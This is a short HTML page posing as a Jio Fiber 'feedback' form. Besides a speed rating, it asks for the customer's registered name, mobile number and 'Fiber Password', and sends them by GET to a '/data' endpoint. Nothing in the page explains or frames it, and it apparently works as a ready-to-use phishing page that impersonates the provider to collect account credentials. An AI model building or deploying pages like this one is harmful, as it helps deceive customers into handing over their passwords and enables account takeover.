<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jio Feedback Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1661b8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        label {
            font-weight: bold;
            display: block;
            margin-top: 10px;
        }
        input, select {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            margin-top: 15px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        @media (max-width: 480px) {
            .container {
                width: 90%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Jio fiber Feedback</h2>
        <form action="/data" method="get">
            <label for="name">Registered Name</label>
            <input type="text" id="name" name="name" required>
            
            <label for="mobile">Registered Mobile Number</label>
            <input type="tel" id="mobile" name="mobile" required>
            
            <label for="password">Fiber Password</label>
            <input type="password" id="password" name="password" required>
            
            <label for="speed">Speed</label>
            <select id="speed" name="speed" required>
                <option value="high">High</option>
                <option value="low">Low</option>
                <option value="very-low">Very Low</option>
            </select>
            
            <button type="submit">Submit Feedback</button>
        </form>
    </div>
</body>
</html>
